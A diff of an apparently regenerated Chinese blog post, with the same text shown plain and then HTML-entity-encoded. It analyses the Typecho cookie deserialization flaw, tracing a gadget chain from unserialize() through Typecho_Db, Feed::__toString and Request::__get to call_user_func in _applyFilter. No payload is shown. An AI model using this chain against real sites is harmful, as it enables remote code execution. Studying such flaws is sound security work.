-<p>可知，这里实例化了一个对象 <em>Typecho_Db</em> 找到这个类所在的页面与代码！为<em>www\var\Typecho\Db.php</em></p>
-<p>这里有一个Typecho_Db类的魔术方法：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName, $prefix = <span class="string">'typecho_'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">        $adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">'isAvailable'</span>))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">"Adapter &#123;$adapterName&#125; is not available"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化适配器对象</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>从代码可知，<em>$adapterName = ‘Typecho_Db_Adapter_’ . $adapterName;</em> 会将$config[‘adapter’]所赋值的$adapterName与一个字符串相加！</p>
-<p>如果通过反序列化，将adapter设置为一个类，那么这个命令就会触发<strong>__toString()</strong>魔术方法！</p>
-<p>用全局搜索搜索所有可利用__toString()方法的地方！</p>
-<p>存在于：<em>www\var\Typecho\Feed.php</em>  在__toString()类下，存在这一段代码！</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_items <span class="keyword">as</span> $item) &#123;</span><br><span class="line">	    $content .= <span class="string">'&lt;item&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">	    $content .= <span class="string">'&lt;title&gt;'</span> . htmlspecialchars($item[<span class="string">'title'</span>]) . <span class="string">'&lt;/title&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">	    $content .= <span class="string">'&lt;link&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'&lt;/link&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">	    $content .= <span class="string">'&lt;guid&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'&lt;/guid&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">	    $content .= <span class="string">'&lt;pubDate&gt;'</span> . <span class="keyword">$this</span>-&gt;dateFormat($item[<span class="string">'date'</span>]) . <span class="string">'&lt;/pubDate&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">	    $content .= <span class="string">'&lt;dc:creator&gt;'</span> . htmlspecialchars($item[<span class="string">'author'</span>]-&gt;screenName) . <span class="string">'&lt;/dc:creator&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">	    ....</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>页面之前的代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line">	....</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addItem</span><span class="params">(array $item)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items[] = $item;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>由上上方的代码此页面前面的代码可知， $this-&gt;items是Typecho_Feed是的一个私有属性。（并且是一个数组）$item是由$this-&gt;items foreach出来的。</p>
-<p>在最后一行，执行了$item[‘author’]-&gt;screenName。通过$item[‘author’]调用了screenName属性。</p>
-<p>如果我们之前通过反序列化将$item[‘author’]设置为没有screenName属性，那么在执行$item[‘author’]-&gt;screenName代码时就会自动调用<strong>_get()</strong>魔术方法。</p>
-<p>再用全局搜索的方法搜索_get() 存在于：<em>www\var\Typecho\Request.php</em></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	...</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这里调用了get方法，继续查找：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_params[$key]):</span><br><span class="line">                $value = <span class="keyword">$this</span>-&gt;_params[$key];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">self</span>::$_httpParams[$key]):</span><br><span class="line">                $value = <span class="keyword">self</span>::$_httpParams[$key];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                $value = $default;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $value = !is_array($value) &amp;&amp; strlen($value) &gt; <span class="number">0</span> ? $value : $default;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_applyFilter($value);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这段代码中，<em>$value = $this-&gt;_params[$key];</em>可知，value变量的值由<em>$this-&gt;_params</em>提供，在最后又执行了<em>$this-&gt;_applyFilter($value);</em> 继续查找applyFilter()方法。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_filter) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filter <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">                $value = is_array($value) ? array_map($filter, $value) :</span><br><span class="line">                call_user_func($filter, $value);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>在这里存在两个反调函数：分别为：array_map(),call_user_func().</p>
+<h3 id="&#x5206;&#x6790;&#x8FC7;&#x7A0B;&#xFF1A;"><a href="#&#x5206;&#x6790;&#x8FC7;&#x7A0B;&#xFF1A;" class="headerlink" title="&#x5206;&#x6790;&#x8FC7;&#x7A0B;&#xFF1A;"></a>&#x5206;&#x6790;&#x8FC7;&#x7A0B;&#xFF1A;</h3><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$config = unserialize(base64_decode(Typecho_Cookie::get(<span class="hljs-string">&apos;__typecho_config&apos;</span>)));</span><br><span class="line">Typecho_Cookie::delete(<span class="hljs-string">&apos;__typecho_config&apos;</span>);</span><br><span class="line">$db = <span class="hljs-keyword">new</span> Typecho_Db($config[<span class="hljs-string">&apos;adapter&apos;</span>], $config[<span class="hljs-string">&apos;prefix&apos;</span>]);</span><br><span class="line">$db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">Typecho_Db::set($db);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x8FD9;&#x91CC;&#x6709;&#x4E2A;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x51FD;&#x6570;&#xFF1A;unserialize()</p>
+<p>&#x5176;&#x4E2D;&#x662F;&#x901A;&#x8FC7;<em>Typecho_Cookie::get()</em>&#x65B9;&#x6CD5;&#x83B7;&#x53D6;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x627E;&#x5230;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x7684;&#x7F51;&#x9875;&#xFF0C;&#x4E3A;<em>www\var\Typecho\Cookie.php</em></p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    $key = <span class="hljs-keyword">self</span>::$_prefix . $key;</span><br><span class="line">    $value = <span class="hljs-keyword">isset</span>($_COOKIE[$key]) ? $_COOKIE[$key] : (<span class="hljs-keyword">isset</span>($_POST[$key]) ? $_POST[$key] : $default);</span><br><span class="line">    <span class="hljs-keyword">return</span> is_array($value) ? $default : $value;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x4ECE;&#x7B2C;&#x56DB;&#x884C;&#x547D;&#x4EE4;&#x53EF;&#x77E5;&#xFF0C;typecho_config&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;COOKIE&#x7684;&#x65B9;&#x5F0F;&#x6216;&#x8005;POST&#x7684;&#x65B9;&#x5F0F;&#x8F93;&#x5165;&#xFF01;</p>
+<p>&#x518D;&#x7EE7;&#x7EED;&#x770B;&#x524D;&#x9762;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x7B2C;&#x56DB;&#x884C;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x53D8;&#x91CF;&#xFF01;</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">	$db = <span class="hljs-keyword">new</span> Typecho_Db($config[<span class="hljs-string">&apos;adapter&apos;</span>], $config[<span class="hljs-string">&apos;prefix&apos;</span>]);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x53EF;&#x77E5;&#xFF0C;&#x8FD9;&#x91CC;&#x5B9E;&#x4F8B;&#x5316;&#x4E86;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61; <em>Typecho_Db</em> &#x627E;&#x5230;&#x8FD9;&#x4E2A;&#x7C7B;&#x6240;&#x5728;&#x7684;&#x9875;&#x9762;&#x4E0E;&#x4EE3;&#x7801;&#xFF01;&#x4E3A;<em>www\var\Typecho\Db.php</em></p>
+<p>&#x8FD9;&#x91CC;&#x6709;&#x4E00;&#x4E2A;Typecho_Db&#x7C7B;&#x7684;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#xFF1A;</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($adapterName, $prefix = <span class="hljs-string">&apos;typecho_&apos;</span>)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-comment">/** &#x83B7;&#x53D6;&#x9002;&#x914D;&#x5668;&#x540D;&#x79F0; */</span></span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">/** &#x6570;&#x636E;&#x5E93;&#x9002;&#x914D;&#x5668; */</span></span><br><span class="line">        $adapterName = <span class="hljs-string">&apos;Typecho_Db_Adapter_&apos;</span> . $adapterName;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> (!call_user_func(<span class="hljs-keyword">array</span>($adapterName, <span class="hljs-string">&apos;isAvailable&apos;</span>))) {</span><br><span class="line">            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Typecho_Db_Exception(<span class="hljs-string">&quot;Adapter {$adapterName} is not available&quot;</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">/** &#x521D;&#x59CB;&#x5316;&#x5185;&#x90E8;&#x53D8;&#x91CF; */</span></span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_pool = <span class="hljs-keyword">array</span>();</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_connectedPool = <span class="hljs-keyword">array</span>();</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_config = <span class="hljs-keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">//&#x5B9E;&#x4F8B;&#x5316;&#x9002;&#x914D;&#x5668;&#x5BF9;&#x8C61;</span></span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_adapter = <span class="hljs-keyword">new</span> $adapterName();</span><br><span class="line">    }</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x4ECE;&#x4EE3;&#x7801;&#x53EF;&#x77E5;&#xFF0C;<em>$adapterName = &#x2018;Typecho_Db_Adapter_&#x2019; . $adapterName;</em> &#x4F1A;&#x5C06;$config[&#x2018;adapter&#x2019;]&#x6240;&#x8D4B;&#x503C;&#x7684;$adapterName&#x4E0E;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x76F8;&#x52A0;&#xFF01;</p>
+<p>&#x5982;&#x679C;&#x901A;&#x8FC7;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x5C06;adapter&#x8BBE;&#x7F6E;&#x4E3A;&#x4E00;&#x4E2A;&#x7C7B;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;&#x547D;&#x4EE4;&#x5C31;&#x4F1A;&#x89E6;&#x53D1;<strong>__toString()</strong>&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#xFF01;</p>
+<p>&#x7528;&#x5168;&#x5C40;&#x641C;&#x7D22;&#x641C;&#x7D22;&#x6240;&#x6709;&#x53EF;&#x5229;&#x7528;__toString()&#x65B9;&#x6CD5;&#x7684;&#x5730;&#x65B9;&#xFF01;</p>
+<p>&#x5B58;&#x5728;&#x4E8E;&#xFF1A;<em>www\var\Typecho\Feed.php</em>  &#x5728;__toString()&#x7C7B;&#x4E0B;&#xFF0C;&#x5B58;&#x5728;&#x8FD9;&#x4E00;&#x6BB5;&#x4EE3;&#x7801;&#xFF01;</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">    <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;_items <span class="hljs-keyword">as</span> $item) {</span><br><span class="line">	    $content .= <span class="hljs-string">&apos;&lt;item&gt;&apos;</span> . <span class="hljs-keyword">self</span>::EOL;</span><br><span class="line">	    $content .= <span class="hljs-string">&apos;&lt;title&gt;&apos;</span> . htmlspecialchars($item[<span class="hljs-string">&apos;title&apos;</span>]) . <span class="hljs-string">&apos;&lt;/title&gt;&apos;</span> . <span class="hljs-keyword">self</span>::EOL;</span><br><span class="line">	    $content .= <span class="hljs-string">&apos;&lt;link&gt;&apos;</span> . $item[<span class="hljs-string">&apos;link&apos;</span>] . <span class="hljs-string">&apos;&lt;/link&gt;&apos;</span> . <span class="hljs-keyword">self</span>::EOL;</span><br><span class="line">	    $content .= <span class="hljs-string">&apos;&lt;guid&gt;&apos;</span> . $item[<span class="hljs-string">&apos;link&apos;</span>] . <span class="hljs-string">&apos;&lt;/guid&gt;&apos;</span> . <span class="hljs-keyword">self</span>::EOL;</span><br><span class="line">	    $content .= <span class="hljs-string">&apos;&lt;pubDate&gt;&apos;</span> . <span class="hljs-keyword">$this</span>-&gt;dateFormat($item[<span class="hljs-string">&apos;date&apos;</span>]) . <span class="hljs-string">&apos;&lt;/pubDate&gt;&apos;</span> . <span class="hljs-keyword">self</span>::EOL;</span><br><span class="line">	    $content .= <span class="hljs-string">&apos;&lt;dc:creator&gt;&apos;</span> . htmlspecialchars($item[<span class="hljs-string">&apos;author&apos;</span>]-&gt;screenName) . <span class="hljs-string">&apos;&lt;/dc:creator&gt;&apos;</span> . <span class="hljs-keyword">self</span>::EOL;</span><br><span class="line">	    ....</span><br><span class="line">	}</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x9875;&#x9762;&#x4E4B;&#x524D;&#x7684;&#x4EE3;&#x7801;&#xFF1A;</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">	<span class="hljs-keyword">private</span> $_items = <span class="hljs-keyword">array</span>();</span><br><span class="line">	....</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addItem</span><span class="hljs-params">(array $item)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_items[] = $item;</span><br><span class="line">    }</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x7531;&#x4E0A;&#x4E0A;&#x65B9;&#x7684;&#x4EE3;&#x7801;&#x6B64;&#x9875;&#x9762;&#x524D;&#x9762;&#x7684;&#x4EE3;&#x7801;&#x53EF;&#x77E5;&#xFF0C; $this-&gt;items&#x662F;Typecho_Feed&#x662F;&#x7684;&#x4E00;&#x4E2A;&#x79C1;&#x6709;&#x5C5E;&#x6027;&#x3002;&#xFF08;&#x5E76;&#x4E14;&#x662F;&#x4E00;&#x4E2A;&#x6570;&#x7EC4;&#xFF09;$item&#x662F;&#x7531;$this-&gt;items foreach&#x51FA;&#x6765;&#x7684;&#x3002;</p>
+<p>&#x5728;&#x6700;&#x540E;&#x4E00;&#x884C;&#xFF0C;&#x6267;&#x884C;&#x4E86;$item[&#x2018;author&#x2019;]-&gt;screenName&#x3002;&#x901A;&#x8FC7;$item[&#x2018;author&#x2019;]&#x8C03;&#x7528;&#x4E86;screenName&#x5C5E;&#x6027;&#x3002;</p>
+<p>&#x5982;&#x679C;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x901A;&#x8FC7;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5C06;$item[&#x2018;author&#x2019;]&#x8BBE;&#x7F6E;&#x4E3A;&#x6CA1;&#x6709;screenName&#x5C5E;&#x6027;&#xFF0C;&#x90A3;&#x4E48;&#x5728;&#x6267;&#x884C;$item[&#x2018;author&#x2019;]-&gt;screenName&#x4EE3;&#x7801;&#x65F6;&#x5C31;&#x4F1A;&#x81EA;&#x52A8;&#x8C03;&#x7528;<strong>_get()</strong>&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x3002;</p>
+<p>&#x518D;&#x7528;&#x5168;&#x5C40;&#x641C;&#x7D22;&#x7684;&#x65B9;&#x6CD5;&#x641C;&#x7D22;_get() &#x5B58;&#x5728;&#x4E8E;&#xFF1A;<em>www\var\Typecho\Request.php</em></p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">	...</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span><span class="hljs-params">($key)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get($key);</span><br><span class="line">    }</span><br><span class="line">    ...</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x8FD9;&#x91CC;&#x8C03;&#x7528;&#x4E86;get&#x65B9;&#x6CD5;&#xFF0C;&#x7EE7;&#x7EED;&#x67E5;&#x627E;&#xFF1A;</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">switch</span> (<span class="hljs-keyword">true</span>) {</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;_params[$key]):</span><br><span class="line">                $value = <span class="hljs-keyword">$this</span>-&gt;_params[$key];</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">self</span>::$_httpParams[$key]):</span><br><span class="line">                $value = <span class="hljs-keyword">self</span>::$_httpParams[$key];</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">default</span>:</span><br><span class="line">                $value = $default;</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        $value = !is_array($value) &amp;&amp; strlen($value) &gt; <span class="hljs-number">0</span> ? $value : $default;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;_applyFilter($value);</span><br><span class="line">    }</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x4E2D;&#xFF0C;<em>$value = $this-&gt;_params[$key];</em>&#x53EF;&#x77E5;&#xFF0C;value&#x53D8;&#x91CF;&#x7684;&#x503C;&#x7531;<em>$this-&gt;_params</em>&#x63D0;&#x4F9B;&#xFF0C;&#x5728;&#x6700;&#x540E;&#x53C8;&#x6267;&#x884C;&#x4E86;<em>$this-&gt;_applyFilter($value);</em> &#x7EE7;&#x7EED;&#x67E5;&#x627E;applyFilter()&#x65B9;&#x6CD5;&#x3002;</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_applyFilter</span><span class="hljs-params">($value)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;_filter) {</span><br><span class="line">            <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;_filter <span class="hljs-keyword">as</span> $filter) {</span><br><span class="line">                $value = is_array($value) ? array_map($filter, $value) :</span><br><span class="line">                call_user_func($filter, $value);</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;_filter = <span class="hljs-keyword">array</span>();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">return</span> $value;</span><br><span class="line">    }</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
